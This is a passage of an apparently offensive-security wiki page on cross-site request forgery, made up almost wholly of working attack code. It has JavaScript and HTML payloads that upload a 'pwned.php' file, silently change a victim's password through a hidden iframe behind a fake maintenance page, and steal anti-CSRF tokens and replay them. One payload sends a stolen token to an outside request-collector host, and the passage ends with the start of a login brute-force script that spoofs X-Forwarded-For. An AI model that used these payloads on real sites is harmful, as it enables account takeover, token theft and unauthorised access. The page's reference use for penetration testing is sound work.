</code></pre></div></div> <h3 id="multipartform-data-post-request">multipart/form-data POST request</h3> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">myFormData</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FormData</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">blob</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Blob</span><span class="p">([</span><span class="dl">"</span><span class="s2">&lt;?php phpinfo(); ?&gt;</span><span class="dl">"</span><span class="p">],</span> <span class="p">{</span> <span class="na">type</span><span class="p">:</span> <span class="dl">"</span><span class="s2">text/text</span><span class="dl">"</span> <span class="p">});</span>
<span class="nx">myFormData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">"</span><span class="s2">newAttachment</span><span class="dl">"</span><span class="p">,</span> <span class="nx">blob</span><span class="p">,</span> <span class="dl">"</span><span class="s2">pwned.php</span><span class="dl">"</span><span class="p">);</span>
<span class="nf">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://example/some/path</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
  <span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span>
  <span class="na">body</span><span class="p">:</span> <span class="nx">myFormData</span><span class="p">,</span>
  <span class="na">credentials</span><span class="p">:</span> <span class="dl">"</span><span class="s2">include</span><span class="dl">"</span><span class="p">,</span>
  <span class="na">headers</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span> <span class="p">},</span>
  <span class="na">mode</span><span class="p">:</span> <span class="dl">"</span><span class="s2">no-cors</span><span class="dl">"</span><span class="p">,</span>
<span class="p">});</span>
</code></pre></div></div> <h3 id="multipartform-data-post-request-v2">multipart/form-data POST request v2</h3> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://www.exploit-db.com/exploits/20009</span>
<span class="kd">var</span> <span class="nx">fileSize</span> <span class="o">=</span> <span class="nx">fileData</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
  <span class="nx">boundary</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">OWNEDBYOFFSEC</span><span class="dl">"</span><span class="p">,</span>
  <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
<span class="c1">//  MIME POST request.</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">multipart/form-data, boundary=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">boundary</span><span class="p">);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Length</span><span class="dl">"</span><span class="p">,</span> <span class="nx">fileSize</span><span class="p">);</span>
<span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">--</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">boundary</span> <span class="o">+</span> <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">body</span> <span class="o">+=</span> <span class="dl">'</span><span class="s1">Content-Disposition: form-data; name="</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">nameVar</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"; filename="</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">fileName</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"</span><span class="se">\r\n</span><span class="dl">'</span><span class="p">;</span>
<span class="nx">body</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">Content-Type: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">ctype</span> <span class="o">+</span> <span class="dl">"</span><span class="se">\r\n\r\n</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">body</span> <span class="o">+=</span> <span class="nx">fileData</span> <span class="o">+</span> <span class="dl">"</span><span class="se">\r\n</span><span class="dl">"</span><span class="p">;</span>
<span class="nx">body</span> <span class="o">+=</span> <span class="dl">"</span><span class="s2">--</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">boundary</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">--</span><span class="dl">"</span><span class="p">;</span>

<span class="c1">//xhr.send(body);</span>
<span class="nx">xhr</span><span class="p">.</span><span class="nf">sendAsBinary</span><span class="p">(</span><span class="nx">body</span><span class="p">);</span>
</code></pre></div></div> <h3 id="form-post-request-from-within-an-iframe">Form POST request from within an iframe</h3> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;--</span><span class="err">!</span> <span class="na">expl.html</span> <span class="na">--</span><span class="nt">&gt;</span>

<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"envia()"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"formulario"</span> <span class="na">action=</span><span class="s">"http://aplicacion.example.com/cambia_pwd.php"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">id=</span><span class="s">"pwd"</span> <span class="na">name=</span><span class="s">"pwd"</span> <span class="na">value=</span><span class="s">"otra nueva"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="kd">function</span> <span class="nf">envia</span><span class="p">()</span> <span class="p">{</span>
        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">formulario</span><span class="dl">"</span><span class="p">).</span><span class="nf">submit</span><span class="p">();</span>
      <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>

    <span class="c">&lt;!-- public.html --&gt;</span>
    <span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"2-1.html"</span> <span class="na">style=</span><span class="s">"position:absolute;top:-5000"</span><span class="nt">&gt;</span> <span class="nt">&lt;/iframe&gt;</span>
    <span class="nt">&lt;h1&gt;</span>Sitio bajo mantenimiento. Disculpe las molestias<span class="nt">&lt;/h1&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/body&gt;</span>
</code></pre></div></div> <h3 id="steal-csrf-token-and-send-a-post-request"><strong>Steal CSRF Token and send a POST request</strong></h3> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">submitFormWithTokenJS</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
  <span class="nx">xhr</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">POST_URL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
  <span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

  <span class="c1">// Send the proper header information along with the request</span>
  <span class="nx">xhr</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>

  <span class="c1">// This is for debugging and can be removed</span>
  <span class="nx">xhr</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">DONE</span> <span class="o">&amp;&amp;</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">//console.log(xhr.responseText);</span>
    <span class="p">}</span>
  <span class="p">};</span>

  <span class="nx">xhr</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">token=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">token</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">&amp;otherparama=heyyyy</span><span class="dl">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">getTokenJS</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
  <span class="c1">// This tels it to return it as a HTML document</span>
  <span class="nx">xhr</span><span class="p">.</span><span class="nx">responseType</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">document</span><span class="dl">"</span><span class="p">;</span>
  <span class="nx">xhr</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
  <span class="c1">// true on the end of here makes the call asynchronous</span>
  <span class="nx">xhr</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">GET_URL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
  <span class="nx">xhr</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nf">function </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">xhr</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">===</span> <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">DONE</span> <span class="o">&amp;&amp;</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
      <span class="c1">// Get the document from the response</span>
      <span class="nx">page</span> <span class="o">=</span> <span class="nx">xhr</span><span class="p">.</span><span class="nx">response</span><span class="p">;</span>
      <span class="c1">// Get the input element</span>
      <span class="nx">input</span> <span class="o">=</span> <span class="nx">page</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">token</span><span class="dl">"</span><span class="p">);</span>
      <span class="c1">// Show the token</span>
      <span class="c1">//console.log("The token is: " + input.value);</span>
      <span class="c1">// Use the token to submit the form</span>
      <span class="nf">submitFormWithTokenJS</span><span class="p">(</span><span class="nx">input</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">};</span>
  <span class="c1">// Make the request</span>
  <span class="nx">xhr</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">var</span> <span class="nx">GET_URL</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://google.com?param=VALUE</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">POST_URL</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://google.com?param=VALUE</span><span class="dl">"</span><span class="p">;</span>
<span class="nf">getTokenJS</span><span class="p">();</span>
</code></pre></div></div> <h3 id="steal-csrf-token-and-send-a-post-request-using-an-iframe-a-form-and-ajax"><strong>Steal CSRF Token and send a Post request using an iframe, a form and Ajax</strong></h3> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"form1"</span> <span class="na">action=</span><span class="s">"http://google.com?param=VALUE"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">value=</span><span class="s">"AA"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"checkbox"</span> <span class="na">name=</span><span class="s">"status"</span> <span class="na">checked=</span><span class="s">"checked"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"token"</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"token"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
  <span class="kd">function</span> <span class="nf">f1</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">x1</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">i1</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">x1d</span> <span class="o">=</span> <span class="nx">x1</span><span class="p">.</span><span class="nx">contentWindow</span> <span class="o">||</span> <span class="nx">x1</span><span class="p">.</span><span class="nx">contentDocument</span><span class="p">;</span>
    <span class="nx">t</span> <span class="o">=</span> <span class="nx">x1d</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">token</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>

    <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">token</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">t</span><span class="p">;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">form1</span><span class="dl">"</span><span class="p">).</span><span class="nf">submit</span><span class="p">();</span>
  <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"i1"</span> <span class="na">style=</span><span class="s">"display:none"</span> <span class="na">src=</span><span class="s">"http://google.com?param=VALUE"</span> <span class="na">onload=</span><span class="s">"javascript:f1();"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div> <h3 id="steal-csrf-token-and-sen-a-post-request-using-an-iframe-and-a-form"><strong>Steal CSRF Token and sen a POST request using an iframe and a form</strong></h3> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"iframe"</span> <span class="na">src=</span><span class="s">"http://google.com?param=VALUE"</span> <span class="na">width=</span><span class="s">"500"</span> <span class="na">height=</span><span class="s">"500"</span> <span class="na">onload=</span><span class="s">"read()"</span><span class="nt">&gt;&lt;/iframe&gt;</span>

<span class="nt">&lt;script&gt;</span>
  <span class="kd">function</span> <span class="nf">read</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">name</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">admin2</span><span class="dl">"</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">).</span><span class="nx">contentDocument</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">token</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data"&gt;</span><span class="dl">'</span><span class="p">);</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;input id="username" type="text" name="username" value="</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">name</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">" /&gt;&lt;br /&gt;</span><span class="dl">'</span><span class="p">);</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;input id="token" type="hidden" name="token" value="</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">token</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">" /&gt;</span><span class="dl">'</span><span class="p">);</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;br/&gt;</span><span class="dl">'</span><span class="p">);</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">writeln</span><span class="p">(</span><span class="dl">"</span><span class="s2">&lt;/form&gt;</span><span class="dl">"</span><span class="p">);</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">.</span><span class="nf">click</span><span class="p">();</span>
  <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div> <h3 id="steal-token-and-send-it-using-2-iframes"><strong>Steal token and send it using 2 iframes</strong></h3> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="kd">var</span> <span class="nx">token</span><span class="p">;</span>
<span class="kd">function</span> <span class="nf">readframe1</span><span class="p">(){</span>
  <span class="nx">token</span> <span class="o">=</span> <span class="nx">frame1</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">profile</span><span class="dl">"</span><span class="p">).</span><span class="nx">token</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
  <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">bypass</span><span class="dl">"</span><span class="p">).</span><span class="nx">token</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">token</span>
  <span class="nf">loadframe2</span><span class="p">();</span>
<span class="p">}</span>
<span class="kd">function</span> <span class="nf">loadframe2</span><span class="p">(){</span>
  <span class="kd">var</span> <span class="nx">test</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementbyId</span><span class="p">(</span><span class="dl">"</span><span class="s2">frame2</span><span class="dl">"</span><span class="p">);</span>
  <span class="nx">test</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://requestb.in/1g6asbg1?token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">token</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"frame1"</span> <span class="na">name=</span><span class="s">"frame1"</span> <span class="na">src=</span><span class="s">"http://google.com?param=VALUE"</span> <span class="na">onload=</span><span class="s">"readframe1()"</span>
<span class="na">sandbox=</span><span class="s">"allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"</span>
<span class="na">height=</span><span class="s">"600"</span> <span class="na">width=</span><span class="s">"800"</span><span class="nt">&gt;&lt;/iframe&gt;</span>

<span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"frame2"</span> <span class="na">name=</span><span class="s">"frame2"</span>
<span class="na">sandbox=</span><span class="s">"allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"</span>
<span class="na">height=</span><span class="s">"600"</span> <span class="na">width=</span><span class="s">"800"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.forms[0].submit()"</span><span class="nt">&gt;</span>
<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"bypass"</span> <span class="na">name</span><span class="err">"</span><span class="na">bypass</span><span class="err">"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">target=</span><span class="s">"frame2"</span> <span class="na">action=</span><span class="s">"http://google.com?param=VALUE"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">value=</span><span class="s">"z"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"checkbox"</span> <span class="na">name=</span><span class="s">"status"</span> <span class="na">checked=</span><span class="s">""</span><span class="nt">&gt;</span>
  <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"token"</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"token"</span> <span class="na">value=</span><span class="s">"0000"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span><span class="nt">&gt;</span>Submit<span class="nt">&lt;/button&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div> <h3 id="poststeal-csrf-token-with-ajax-and-send-a-post-with-a-form"><strong>POSTSteal CSRF token with Ajax and send a post with a form</strong></h3> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"getData()"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"form"</span> <span class="na">action=</span><span class="s">"http://google.com?param=VALUE"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">enctype=</span><span class="s">"multipart/form-data"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">value=</span><span class="s">"root"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"status"</span> <span class="na">value=</span><span class="s">"on"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">id=</span><span class="s">"findtoken"</span> <span class="na">name=</span><span class="s">"token"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"valider"</span> <span class="nt">/&gt;</span>
  <span class="nt">&lt;/form&gt;</span>

  <span class="nt">&lt;script&gt;</span>
    <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
    <span class="kd">function</span> <span class="nf">getData</span><span class="p">()</span> <span class="p">{</span>
      <span class="nx">x</span><span class="p">.</span><span class="nx">withCredentials</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
      <span class="nx">x</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">http://google.com?param=VALUE</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
      <span class="nx">x</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nx">x</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
      <span class="k">if </span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="nx">XMLHttpRequest</span><span class="p">.</span><span class="nx">DONE</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="nx">x</span><span class="p">.</span><span class="nx">responseText</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/name="token" value="</span><span class="se">(</span><span class="sr">.+</span><span class="se">)</span><span class="sr">"/</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">findtoken</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">token</span><span class="p">;</span>
        <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">form</span><span class="dl">"</span><span class="p">).</span><span class="nf">submit</span><span class="p">();</span>
      <span class="p">}</span>
    <span class="p">};</span>
  <span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;/body&gt;</span>
</code></pre></div></div> <h3 id="csrf-with-socketio">CSRF with Socket.IO</h3> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script&gt;</span>
  <span class="kd">let</span> <span class="nx">socket</span> <span class="o">=</span> <span class="nf">io</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://six.jh2i.com:50022/test</span><span class="dl">"</span><span class="p">);</span>

  <span class="kd">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">;</span>

  <span class="nx">socket</span><span class="p">.</span><span class="nf">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">connect</span><span class="dl">"</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">connected!</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">socket</span><span class="p">.</span><span class="nf">emit</span><span class="p">(</span><span class="dl">"</span><span class="s2">join</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
      <span class="na">room</span><span class="p">:</span> <span class="nx">username</span><span class="p">,</span>
    <span class="p">});</span>
    <span class="nx">socket</span><span class="p">.</span><span class="nf">emit</span><span class="p">(</span><span class="dl">"</span><span class="s2">my_room_event</span><span class="dl">"</span><span class="p">,</span> <span class="p">{</span>
      <span class="na">data</span><span class="p">:</span> <span class="dl">"</span><span class="s2">!flag</span><span class="dl">"</span><span class="p">,</span>
      <span class="na">room</span><span class="p">:</span> <span class="nx">username</span><span class="p">,</span>
    <span class="p">});</span>
  <span class="p">});</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div> <h2 id="csrf-login-brute-force">CSRF Login Brute Force</h2> <p>The code can be used to Brut Force a login form using a CSRF token (It’s also using the header X-Forwarded-For to try to bypass a possible IP blacklisting):</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">request</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">random</span>

<span class="n">URL</span> <span class="o">=</span> <span class="sh">"</span><span class="s">http://10.10.10.191/admin/</span><span class="sh">"</span>
<span class="n">PROXY</span> <span class="o">=</span> <span class="p">{</span> <span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">127.0.0.1:8080</span><span class="sh">"</span><span class="p">}</span>
<span class="n">SESSION_COOKIE_NAME</span> <span class="o">=</span> <span class="sh">"</span><span class="s">BLUDIT-KEY</span><span class="sh">"</span>
<span class="n">USER</span> <span class="o">=</span> <span class="sh">"</span><span class="s">fergus</span><span class="sh">"</span>
<span class="n">PASS_LIST</span><span class="o">=</span><span class="sh">"</span><span class="s">./words</span><span class="sh">"</span>

<span class="k">def</span> <span class="nf">init_session</span><span class="p">():</span>
    <span class="c1">#Return CSRF + Session (cookie)
</span>    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
    <span class="n">csrf</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">input type=</span><span class="sh">"</span><span class="s">hidden</span><span class="sh">"</span><span class="s"> id=</span><span class="sh">"</span><span class="s">jstokenCSRF</span><span class="sh">"</span><span class="s"> name=</span><span class="sh">"</span><span class="s">tokenCSRF</span><span class="sh">"</span><span class="s"> value=</span><span class="sh">"</span><span class="s">([a-zA-Z0-9]*)</span><span class="sh">"'</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
    <span class="n">csrf</span> <span class="o">=</span> <span class="n">csrf</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">session_cookie</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">cookies</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">SESSION_COOKIE_NAME</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">csrf</span><span class="p">,</span> <span class="n">session_cookie</span>

